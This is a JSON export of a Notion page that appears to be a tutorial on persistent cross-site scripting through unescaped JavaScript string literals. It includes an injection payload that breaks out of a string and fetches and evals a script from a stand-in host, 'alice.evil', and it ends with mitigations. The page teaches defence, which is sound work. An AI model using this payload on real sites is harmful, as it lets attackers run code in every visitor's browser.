{
  "ID": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
  "Root": {
    "alive": true,
    "content": [
      "21d2f376-ff4b-4c38-bead-f5db4a9bec3f",
      "a13908ae-cc73-4d07-83fc-b8a2ca8644e0",
      "29c1f730-329c-41ee-81d5-cb40e0e4ac29",
      "a9d48d31-01ef-42ae-a16f-f494934d6008",
      "4840f573-39c8-4582-9a34-a1817dea8e8f",
      "a7b59c38-1e1a-4951-8849-3fc6a9fc3b23",
      "7f747730-9bc9-4564-b7a2-2bc3abfc7671",
      "0d8ee0d6-8111-4d45-81de-2bc4cefcde32",
      "8c7f70fa-c9c6-43d9-a83a-5bc0863bc98d",
      "b3092b77-0c9a-4b5f-9740-52dfb8555a6f",
      "8fc90b1f-63d6-4633-8f61-638cb64a6e1f",
      "413ea6d3-1849-491e-91ba-f69d1ab0b566",
      "29fca3d5-52ec-4fee-82b4-7f05f3e267a8",
      "c3624ab2-bf08-4870-bbcb-c6776327f3e5",
      "065516d3-518c-4db3-836e-0f32c400c890",
      "4d00987c-f8df-4e6b-8b8a-4ccdf426898d",
      "43523e8d-e7b3-4016-86f4-39b4af245803",
      "7620592f-bbe7-4032-9191-6c07411affe2",
      "e4609ac9-9300-4292-b1fc-63d88160a38e"
    ],
    "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
    "created_time": 1550717341351,
    "id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
    "ignore_block_count": true,
    "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
    "last_edited_time": 1550717341351,
    "parent_id": "445950ca-50ee-4bba-bc24-3257c936402f",
    "parent_table": "block",
    "properties": {
      "title": [
        [
          "030 Persistent Cross-site scripting from JavaScript string literals"
        ]
      ]
    },
    "type": "page",
    "version": 1,
    "content_resolved": [
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341342,
        "id": "21d2f376-ff4b-4c38-bead-f5db4a9bec3f",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341342,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Let’s say that Bob owns a site that lets you post public messages."
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "Let’s say that Bob owns a site that lets you post public messages."
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341344,
        "id": "a13908ae-cc73-4d07-83fc-b8a2ca8644e0",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341344,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "The messages are loaded by a script that looks like this:"
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "The messages are loaded by a script that looks like this:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341345,
        "id": "29c1f730-329c-41ee-81d5-cb40e0e4ac29",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341345,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "language": [
            [
              "Plain Text"
            ]
          ],
          "title": [
            [
              "addMessage(\"Message 1\");\naddMessage(\"Message 2\");\naddMessage(\"Message 3\");\naddMessage(\"Message 4\");\naddMessage(\"Message 5\");\naddMessage(\"Message 6\");"
            ]
          ]
        },
        "type": "code",
        "version": 1,
        "code": "addMessage(\"Message 1\");\naddMessage(\"Message 2\");\naddMessage(\"Message 3\");\naddMessage(\"Message 4\");\naddMessage(\"Message 5\");\naddMessage(\"Message 6\");",
        "code_language": "Plain Text"
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341345,
        "id": "a9d48d31-01ef-42ae-a16f-f494934d6008",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341345,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "The "
            ],
            [
              "addMessage",
              [
                [
                  "c"
                ]
              ]
            ],
            [
              " function adds a posted message to the DOM. However, in an effort to avoid XSS, "
            ],
            [
              "any HTML in messages posted is escaped.",
              [
                [
                  "b"
                ]
              ]
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "The "
          },
          {
            "Text": "addMessage",
            "AttrFlags": 2
          },
          {
            "Text": " function adds a posted message to the DOM. However, in an effort to avoid XSS, "
          },
          {
            "Text": "any HTML in messages posted is escaped.",
            "AttrFlags": 1
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341345,
        "id": "4840f573-39c8-4582-9a34-a1817dea8e8f",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341345,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "The script is generated "
            ],
            [
              "on the server",
              [
                [
                  "b"
                ]
              ]
            ],
            [
              " like this:"
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "The script is generated "
          },
          {
            "Text": "on the server",
            "AttrFlags": 1
          },
          {
            "Text": " like this:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341345,
        "id": "a7b59c38-1e1a-4951-8849-3fc6a9fc3b23",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341345,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "language": [
            [
              "Plain Text"
            ]
          ],
          "title": [
            [
              "for(var i = 0; i \u003c messages.length; i++){\n    script += \"addMessage(\\\"\" + messages[i] + \"\\\");\";\n}"
            ]
          ]
        },
        "type": "code",
        "version": 1,
        "code": "for(var i = 0; i \u003c messages.length; i++){\n    script += \"addMessage(\\\"\" + messages[i] + \"\\\");\";\n}",
        "code_language": "Plain Text"
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "7f747730-9bc9-4564-b7a2-2bc3abfc7671",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "So alice posts a message that says: "
            ],
            [
              "My mom said: \"Life is good. Pie makes it better. \"",
              [
                [
                  "c"
                ]
              ]
            ],
            [
              ". Than when she previews the message, instead of seeing her message she sees an error in the console:"
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "So alice posts a message that says: "
          },
          {
            "Text": "My mom said: \"Life is good. Pie makes it better. \"",
            "AttrFlags": 2
          },
          {
            "Text": ". Than when she previews the message, instead of seeing her message she sees an error in the console:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "0d8ee0d6-8111-4d45-81de-2bc4cefcde32",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "language": [
            [
              "Plain Text"
            ]
          ],
          "title": [
            [
              "Uncaught SyntaxError: missing ) after argument list"
            ]
          ]
        },
        "type": "code",
        "version": 1,
        "code": "Uncaught SyntaxError: missing ) after argument list",
        "code_language": "Plain Text"
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "8c7f70fa-c9c6-43d9-a83a-5bc0863bc98d",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Why? Because the generated script looks like this:"
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "Why? Because the generated script looks like this:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "b3092b77-0c9a-4b5f-9740-52dfb8555a6f",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "language": [
            [
              "Plain Text"
            ]
          ],
          "title": [
            [
              "addMessage(\"My mom said: \"Life is good. Pie makes it better. \"\");"
            ]
          ]
        },
        "type": "code",
        "version": 1,
        "code": "addMessage(\"My mom said: \"Life is good. Pie makes it better. \"\");",
        "code_language": "Plain Text"
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "8fc90b1f-63d6-4633-8f61-638cb64a6e1f",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "That’s a syntax error. Than Alice posts:"
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "That’s a syntax error. Than Alice posts:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "413ea6d3-1849-491e-91ba-f69d1ab0b566",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "language": [
            [
              "Plain Text"
            ]
          ],
          "title": [
            [
              "I like pie \");fetch(\"https://alice.evil/js_xss.js\").then(x=\u003ex.text()).then(eval);//"
            ]
          ]
        },
        "type": "code",
        "version": 1,
        "code": "I like pie \");fetch(\"https://alice.evil/js_xss.js\").then(x=\u003ex.text()).then(eval);//",
        "code_language": "Plain Text"
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "29fca3d5-52ec-4fee-82b4-7f05f3e267a8",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Then the generated script looks like:"
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "Then the generated script looks like:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341346,
        "id": "c3624ab2-bf08-4870-bbcb-c6776327f3e5",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341346,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "language": [
            [
              "Plain Text"
            ]
          ],
          "title": [
            [
              "addMessage(\"I like pie \");fetch(\"https://alice.evil/js_xss.js\").then(x=\u003ex.text()).then(eval);//\");"
            ]
          ]
        },
        "type": "code",
        "version": 1,
        "code": "addMessage(\"I like pie \");fetch(\"https://alice.evil/js_xss.js\").then(x=\u003ex.text()).then(eval);//\");",
        "code_language": "Plain Text"
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341347,
        "id": "065516d3-518c-4db3-836e-0f32c400c890",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341347,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "That adds the message "
            ],
            [
              "I like pie",
              [
                [
                  "c"
                ]
              ]
            ],
            [
              ", but it also "
            ],
            [
              "downloads and runs ",
              [
                [
                  "b"
                ]
              ]
            ],
            [
              "https://alice.evil/js_xss.js",
              [
                [
                  "b"
                ],
                [
                  "c"
                ]
              ]
            ],
            [
              " whenever someone visits Bob’s site.",
              [
                [
                  "b"
                ]
              ]
            ]
          ]
        },
        "type": "text",
        "version": 1,
        "inline_content": [
          {
            "Text": "That adds the message "
          },
          {
            "Text": "I like pie",
            "AttrFlags": 2
          },
          {
            "Text": ", but it also "
          },
          {
            "Text": "downloads and runs ",
            "AttrFlags": 1
          },
          {
            "Text": "https://alice.evil/js_xss.js",
            "AttrFlags": 3
          },
          {
            "Text": " whenever someone visits Bob’s site.",
            "AttrFlags": 1
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341347,
        "id": "4d00987c-f8df-4e6b-8b8a-4ccdf426898d",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341347,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Mitigation:"
            ]
          ]
        },
        "type": "header",
        "version": 1,
        "inline_content": [
          {
            "Text": "Mitigation:"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341350,
        "id": "43523e8d-e7b3-4016-86f4-39b4af245803",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341350,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Pass the message posted into "
            ],
            [
              "JSON.stringify()",
              [
                [
                  "a",
                  "https://stackoverflow.com/documentation/javascript/416/json/1385/serializing-a-value#t=201707081354449681532"
                ]
              ]
            ]
          ]
        },
        "type": "numbered_list",
        "version": 1,
        "inline_content": [
          {
            "Text": "Pass the message posted into "
          },
          {
            "Text": "JSON.stringify()",
            "Link": "https://stackoverflow.com/documentation/javascript/416/json/1385/serializing-a-value#t=201707081354449681532"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341350,
        "id": "7620592f-bbe7-4032-9191-6c07411affe2",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341350,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Instead of dynamically building a script, build a plain text file containing all the messages that is later fetched by the script"
            ]
          ]
        },
        "type": "numbered_list",
        "version": 1,
        "inline_content": [
          {
            "Text": "Instead of dynamically building a script, build a plain text file containing all the messages that is later fetched by the script"
          }
        ]
      },
      {
        "alive": true,
        "created_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "created_time": 1550717341351,
        "id": "e4609ac9-9300-4292-b1fc-63d88160a38e",
        "ignore_block_count": true,
        "last_edited_by": "bb760e2d-d679-4b64-b2a9-03005b21870a",
        "last_edited_time": 1550717341351,
        "parent_id": "1c0c374d-9c85-48e7-a96c-576e44e9b91d",
        "parent_table": "block",
        "properties": {
          "title": [
            [
              "Add a ",
              [
                [
                  "b"
                ]
              ]
            ],
            [
              "Content Security Policy",
              [
                [
                  "b"
                ],
                [
                  "a",
                  "https://stackoverflow.com/q/30280370/6560716"
                ]
              ]
            ],
            [
              " that refuses to load active content from other domains",
              [
                [
                  "b"
                ]
              ]
            ]
          ]
        },
        "type": "numbered_list",
        "version": 1,
        "inline_content": [
          {
            "Text": "Add a ",
            "AttrFlags": 1
          },
          {
            "Text": "Content Security Policy",
            "AttrFlags": 1,
            "Link": "https://stackoverflow.com/q/30280370/6560716"
          },
          {
            "Text": " that refuses to load active content from other domains",
            "AttrFlags": 1
          }
        ]
      }
    ],
    "title": "030 Persistent Cross-site scripting from JavaScript string literals"
  },
  "Users": [
    {
      "email": "kkowalczyk@gmail.com",
      "family_name": "Kowalczyk",
      "given_name": "Krzysztof",
      "id": "bb760e2d-d679-4b64-b2a9-03005b21870a",
      "locale": "en",
      "mobile_onboarding_completed": true,
      "onboarding_completed": true,
      "profile_photo": "https://s3-us-west-2.amazonaws.com/public.notion-static.com/2dcaa66c-7674-4ff6-9924-601785b63561/head-bw-640x960.png",
      "time_zone": "America/Los_Angeles",
      "version": 18
    }
  ],
  "Tables": null
}